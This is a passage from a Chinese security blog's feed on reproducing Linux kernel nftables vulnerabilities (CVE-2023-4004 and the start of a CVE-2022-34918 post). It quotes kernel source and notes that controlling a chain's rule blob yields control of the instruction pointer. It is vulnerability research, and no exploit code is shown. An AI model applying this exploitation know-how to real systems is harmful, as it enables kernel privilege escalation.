class="line">u16udlen;</span><br><span class="line">u8*udata;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used during control plane commit phase: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span>*<span class="title">blob_next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在看到<code>nft_chain</code>结构体中还存在<code>blob_next</code>成员<code>blob_gen_0</code>以及<code>blob_gen_0</code>成员叫人难以理解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_commit</span><span class="params">(struct net *net, struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>, *<span class="title">next</span>;</span></span><br><span class="line">LIST_HEAD(set_update_list);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans_elem</span> *<span class="title">te</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> base_seq;</span><br><span class="line">LIST_HEAD(adl);</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1.  Allocate space for next generation rules_gen_X[] */</span></span><br><span class="line">list_for_each_entry_safe(trans, next, &amp;nft_net-&gt;commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = nf_tables_commit_audit_alloc(&amp;adl, trans-&gt;ctx.table);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">nf_tables_commit_chain_prepare_cancel(net);</span><br><span class="line">nf_tables_commit_audit_free(&amp;adl);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (trans-&gt;msg_type == NFT_MSG_NEWRULE ||</span><br><span class="line">    trans-&gt;msg_type == NFT_MSG_DELRULE) &#123;</span><br><span class="line">chain = trans-&gt;ctx.chain;</span><br><span class="line"></span><br><span class="line">ret = nf_tables_commit_chain_prepare(net, chain);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nf_tables_commit_chain_prepare_cancel(net);</span><br><span class="line">nf_tables_commit_audit_free(&amp;adl);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* step 2.  Make rules_gen_X visible to packet path */</span></span><br><span class="line">list_for_each_entry(table, &amp;nft_net-&gt;tables, <span class="built_in">list</span>) &#123;</span><br><span class="line">list_for_each_entry(chain, &amp;table-&gt;chains, <span class="built_in">list</span>)</span><br><span class="line">nf_tables_commit_chain(net, chain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到这里会在进入后面的switch之前对newrule一点操作，具体操作因为篇幅问题就不过多介绍，大概就是前面的for循环是将新生成的rule放到这里，后面则是放到另外两个结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">nft_do_chain</span><span class="params">(struct nft_pktinfo *pkt, <span class="keyword">void</span> *priv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> priv, *basechain = chain;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> nft_net(pkt);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>, *<span class="title">last</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_dp</span> *<span class="title">rule</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_regs</span> <span class="title">regs</span> =</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> stackptr = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_jumpstack</span> <span class="title">jumpstack</span>[<span class="title">NFT_JUMP_STACK_SIZE</span>];</span></span><br><span class="line"><span class="keyword">bool</span> genbit = READ_ONCE(net-&gt;nft.gencursor);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span> *<span class="title">blob</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_traceinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">do_chain:</span><br><span class="line"><span class="keyword">if</span> (genbit)</span><br><span class="line">blob = rcu_dereference(chain-&gt;blob_gen_1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">blob = rcu_dereference(chain-&gt;blob_gen_0);</span><br><span class="line"></span><br><span class="line">rule = (struct nft_rule_dp *)blob-&gt;data;</span><br><span class="line">next_rule:</span><br><span class="line">regs.verdict.code = NFT_CONTINUE;</span><br><span class="line"><span class="keyword">for</span> (; !rule-&gt;is_last ; rule = nft_rule_next(rule)) &#123;</span><br><span class="line">nft_rule_dp_for_each_expr(expr, last, rule) &#123;</span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops == &amp;nft_cmp_fast_ops)</span><br><span class="line">nft_cmp_fast_eval(expr, &amp;regs);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (expr-&gt;ops == &amp;nft_cmp16_fast_ops)</span><br><span class="line">nft_cmp16_fast_eval(expr, &amp;regs);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (expr-&gt;ops == &amp;nft_bitwise_fast_ops)</span><br><span class="line">nft_bitwise_fast_eval(expr, &amp;regs);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (expr-&gt;ops != &amp;nft_payload_fast_ops ||</span><br><span class="line"> !nft_payload_fast_eval(expr, &amp;regs, pkt))</span><br><span class="line">expr_call_ops_eval(expr, &amp;regs, pkt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (regs.verdict.code != NFT_CONTINUE)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">EXPORT_SYMBOL_GPL(nft_do_chain);</span><br></pre></td></tr></table></figure><p>函数<code>nft_do_chain</code>会在评估数据包的时候调用，这里会从<code>blob_gen_0</code>中拿到blob最终拿到rule和expr，然后根据ops调用对应的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">expr_call_ops_eval</span><span class="params">(<span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_regs *regs,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_pktinfo *pkt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_RETPOLINE</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> e;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nf_skip_indirect_calls())</span><br><span class="line"><span class="keyword">goto</span> indirect_call;</span><br><span class="line"></span><br><span class="line">e = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)expr-&gt;ops-&gt;eval;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X(e, fun) \</span></span><br><span class="line"><span class="meta">do &#123; <span class="meta-keyword">if</span> ((e) == (unsigned long)(fun)) \</span></span><br><span class="line"><span class="meta">return fun(expr, regs, pkt); &#125; while (0)</span></span><br><span class="line"></span><br><span class="line">X(e, nft_payload_eval);</span><br><span class="line">X(e, nft_cmp_eval);</span><br><span class="line">X(e, nft_counter_eval);</span><br><span class="line">X(e, nft_meta_get_eval);</span><br><span class="line">X(e, nft_lookup_eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_NFT_CT)</span></span><br><span class="line">X(e, nft_ct_get_fast_eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">X(e, nft_range_eval);</span><br><span class="line">X(e, nft_immediate_eval);</span><br><span class="line">X(e, nft_byteorder_eval);</span><br><span class="line">X(e, nft_dynset_eval);</span><br><span class="line">X(e, nft_rt_get_eval);</span><br><span class="line">X(e, nft_bitwise_eval);</span><br><span class="line">X(e, nft_objref_eval);</span><br><span class="line">X(e, nft_objref_map_eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  X</span></span><br><span class="line">indirect_call:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_RETPOLINE */</span></span></span><br><span class="line">expr-&gt;ops-&gt;eval(expr, regs, pkt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里原作者的思路就是控制到blob即可控制RIP了。</p><hr><p>参考链接:</p><p><a class="link"   href="https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4004_lts_cos_mitigation/docs/exploit.md#rop-detail" >https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4004_lts_cos_mitigation/docs/exploit.md#rop-detail<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4015_lts/docs/exploit.md" >https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4015_lts/docs/exploit.md<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;CVE复现还是要趁热复现，不要因为其他事耽误了TvT，毕竟挖洞是重中之重特别是对现在的我来说，一个洞都没有TvT。&lt;/p&gt;
&lt;p&gt;不知道算是</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="nft_set_pipapo_type" scheme="https://196082.github.io/tags/nft-set-pipapo-type/"/>
    
    <category term="nft_rule_expr_deactivate" scheme="https://196082.github.io/tags/nft-rule-expr-deactivate/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-34918</title>
    <link href="https://196082.github.io/2024/08/27/CVE-2022-34918/"/>
    <id>https://196082.github.io/2024/08/27/CVE-2022-34918/</id>
    <published>2024-08-27T09:25:14.000Z</published>
    <updated>2024-08-30T11:10:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇应该是关于nftables类型的最后一篇有写exp的文章，在后续的复现文章只会进行漏洞分析以及利用手法分析。</p><h2 id="element简介"><a href="#element简介" class="headerlink" title="element简介"></a>element简介</h2><p>在介绍之前不得不先提起一下set集合了。在nftables中，集合算是实现map以及verdict map的重要基础，对于map就是大家熟知的键值对的形式，而verdict map其实也是简直对的形式不过其具有判决效果可以进行一系列操作例如：accept、drop、jump之类的。</p><h3 id="nf-tables-newsetelem分析"><a href="#nf-tables-newsetelem分析" class="headerlink" title="nf_tables_newsetelem分析"></a>nf_tables_newsetelem分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newsetelem</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">int</span> rem, err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_LIST_ELEMENTS] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_ctx_init_from_elemattr(&amp;ctx, net, skb, nlh, nla, extack,</span><br><span class="line"> genmask);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup_global(net, ctx.table, nla[NFTA_SET_ELEM_LIST_SET],</span><br><span class="line">    nla[NFTA_SET_ELEM_LIST_SET_ID], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; <span class="built_in">set</span>-&gt;flags &amp; NFT_SET_CONSTANT)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">nla_for_each_nested (attr, nla[NFTA_SET_ELEM_LIST_ELEMENTS], rem) &#123;</span><br><span class="line">err = nft_add_set_elem(&amp;ctx, <span class="built_in">set</span>, attr, nlh-&gt;nlmsg_flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (net-&gt;nft.validate_state == NFT_VALIDATE_DO)</span><br><span class="line"><span class="keyword">return</span> nft_table_validate(net, ctx.table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数内首先调用<code>nft_ctx_init_from_elemattr</code>函数对ctx进行初始化。随后通过<code>nft_set_lookup_global</code>函数找到set。最后真正添加的函数为<code>nft_add_set_elem</code>。</p><h3 id="nft-add-set-elem分析"><a href="#nft-add-set-elem分析" class="headerlink" title="nft_add_set_elem分析"></a>nft_add_set_elem分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_add_set_elem</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *attr, u32 nlmsg_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(nla, NFTA_SET_ELEM_MAX, attr,</span><br><span class="line">  nft_set_elem_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">nft_set_ext_prepare(&amp;tmpl);</span><br><span class="line"></span><br><span class="line">err = nft_setelem_parse_flags(<span class="built_in">set</span>, nla[NFTA_SET_ELEM_FLAGS], &amp;flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_FLAGS);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_DATA] == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    !(flags &amp; NFT_SET_ELEM_INTERVAL_END))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; NFT_SET_ELEM_INTERVAL_END) &amp;&amp;</span><br><span class="line">    (nla[NFTA_SET_ELEM_DATA] || nla[NFTA_SET_ELEM_OBJREF] ||</span><br><span class="line">     nla[NFTA_SET_ELEM_TIMEOUT] || nla[NFTA_SET_ELEM_EXPIRATION] ||</span><br><span class="line">     nla[NFTA_SET_ELEM_USERDATA] || nla[NFTA_SET_ELEM_EXPR]))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_TIMEOUT] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">err = nf_msecs_to_jiffies64(nla[NFTA_SET_ELEM_TIMEOUT],</span><br><span class="line">    &amp;timeout);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT) &#123;</span><br><span class="line">timeout = <span class="built_in">set</span>-&gt;timeout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expiration = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_EXPIRATION] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">err = nf_msecs_to_jiffies64(nla[NFTA_SET_ELEM_EXPIRATION],</span><br><span class="line">    &amp;expiration);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_EXPR] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">expr = nft_set_elem_expr_alloc(ctx, <span class="built_in">set</span>,</span><br><span class="line">       nla[NFTA_SET_ELEM_EXPR]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(expr);</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;expr &amp;&amp; <span class="built_in">set</span>-&gt;expr-&gt;ops != expr-&gt;ops)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;expr) &#123;</span><br><span class="line">expr = kzalloc(<span class="built_in">set</span>-&gt;expr-&gt;ops-&gt;size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!expr)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">err = nft_expr_clone(expr, <span class="built_in">set</span>-&gt;expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key.val,</span><br><span class="line">    nla[NFTA_SET_ELEM_KEY]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"></span><br><span class="line">nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY, <span 